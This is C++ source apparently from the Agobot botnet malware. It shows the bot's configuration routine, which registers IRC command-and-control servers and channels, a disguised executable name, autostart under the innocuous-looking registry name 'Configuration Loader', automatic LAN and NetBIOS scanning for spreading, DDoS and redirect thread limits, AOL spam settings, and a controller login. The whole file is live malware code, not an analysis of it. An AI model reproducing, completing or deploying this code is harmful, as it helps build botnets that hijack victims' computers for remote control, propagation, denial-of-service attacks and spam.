#include "main.h"
#include "bot.h"
#include "mainctrl.h"

void CBot::Config()
{	init_random(); int iCryptKey=10; CString sTemp; sTemp.Format("%d", brandom(500, 22226));

	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_compnick,"bot_compnick","false","CompName Generated Nick",false,false,0);	
	
	// The root server, this will be the most often used one
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServerRoot.si_chanpass,	"si_server_root.chanpass", \
		"",								"Server Info - Channel Password",	false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServerRoot.si_mainchan,	"si_server_root.mainchan", \
		"#channel",						"Server Info - Main Channel",		false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServerRoot.si_nickprefix,	"si_server_root.nickprefix", \
		"Ago-",							"Server Info - Nickname prefix",	false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServerRoot.si_port,		"si_server_root.port", \
		"6667",							"Server Info - Server Port",		false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServerRoot.si_server,		"si_server_root.server", \
		"irc.somewhere.org",			"Server Info - Server Address",		false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServerRoot.si_servpass,	"si_server_root.servpass", \
		"",								"Server Info - Server Password",	false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServerRoot.si_usessl,		"si_server_root.use_ssl", \
		"false",						"Server Info - Use SSL ?",			false, false, 0 );
	g_cMainCtrl.m_cIRC.m_vServers.push_back(&m_isServerRoot);

	// Backup server 0
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServer0.si_chanpass,		"si_server_0.chanpass", \
		"",								"Server Info - Channel Password",	false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServer0.si_mainchan,		"si_server_0.mainchan", \
		"#channel",						"Server Info - Main Channel",		false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServer0.si_nickprefix,	"si_server_0.nickprefix", \
		"Ago-",							"Server Info - Nickname prefix",	false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServer0.si_port,			"si_server_0.port", \
		"6667",							"Server Info - Server Port",		false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServer0.si_server,		"si_server_0.server", \
		"irc2.somewhere.org",			"Server Info - Server Address",		false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServer0.si_servpass,		"si_server_0.servpass", \
		"",								"Server Info - Server Password",	false, false, 0 );
	g_cMainCtrl.m_cCVar.RegisterCvar(&m_isServer0.si_usessl,		"si_server_0.use_ssl", \
		"false",						"Server Info - Use SSL ?",			false, false, 0 );
	g_cMainCtrl.m_cIRC.m_vServers.push_back(&m_isServer0);

	g_cMainCtrl.m_cCVar.RegisterCvar(&si_chanpass,		"si_chanpass",		"",							"Server Info - Channel Password",					false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&si_mainchan,		"si_mainchan",		"",							"Server Info - Main Channel",						false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&si_nickprefix,	"si_nickprefix",	"",							"Server Info - Nickname prefix",					false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&si_port,			"si_port",			"",							"Server Info - Server Port",						false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&si_server,		"si_server",		"",							"Server Info - Server Address",						false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&si_servpass,		"si_servpass",		"",							"Server Info - Server Password",					false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&si_usessl,		"si_usessl",		"",							"Server Info - Use SSL ?",							false,	false,	0			);

	g_cMainCtrl.m_cCVar.RegisterCvar(&si_nick,			"si_nick",			"",							"Server Info - Nickname",							false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_version,		"bot_version",		VERSION_AGOBOT,				"Bot - Version",									false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_filename,		"bot_filename",		"filename.exe",				"Bot - Runtime Filename",							false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_id,			"bot_id",			"a3-100",					"Bot - Current ID",									false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_prefix,		"bot_prefix",		".",						"Bot - Command Prefix",								false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_ftrans_port,	"bot_ftrans_port",	sTemp.CStr(),				"Bot - File Transfer Port",							false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_timeout,		"bot_timeout",		"720000",					"Bot - Timeout for receiving in miliseconds",		false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_seclogin,		"bot_seclogin",		"false",					"Bot - Enable login only by channel messages",		false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&bot_compnick,		"bot_compnick",		"false",					"Bot - Use the computer name as a nickname",		false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&as_valname,		"as_valname",		"Configuration Loader",		"Autostart - Value Name",							false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&as_enabled,		"as_enabled",		"true",						"Autostart - Enabled",								false,	false,	0			);

	g_cMainCtrl.m_cCVar.RegisterCvar(&scan_maxthreads,	"scan_maxthreads",	"100",						"Scanner - Maximum Number of threads",				false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&scan_auto,		"scan_auto",		"true",						"Scanner - Autoscan local network",					false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&scan_auto,		"scan_auto_nb",		"true",						"Scanner - Autoscan LAN for NetBIOS",				false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&ddos_maxthreads,	"ddos_maxthreads",	"100",						"DDOS - Maximum Number of threads",					false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&redir_maxthreads,	"redir_maxthreads",	"100",						"Redirect - Maximum Number of threads",				false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&identd_enabled,	"identd_enabled",	"false",					"IdentD - Enable the server",						false,	false,	0			);

	g_cMainCtrl.m_cCVar.RegisterCvar(&spam_aol_channel,	"spam_aol_channel",	"#aolspam",					"AOL Spam - Channel name",							false,	false,	0			);
	g_cMainCtrl.m_cCVar.RegisterCvar(&spam_aol_enabled,	"spam_aol_enabled",	"true",					"AOL Spam - Channel name",								false,	false,	0			);

	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_chanpass, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_chanpass.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_mainchan, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_mainchan.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_nickprefix, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_nickprefix.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_port, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_port.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_server, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_server.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_servpass, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_servpass.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_usessl, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_usessl.sValue.CStr());

	// Use MD5 Passwords, for security reasons
	g_cMainCtrl.m_cMac.AddUser("User",			"MYMD5HASHWILLBEBIGBADANDLONGHEHE",	"Netmask.Net",	""	);	// "password"
}
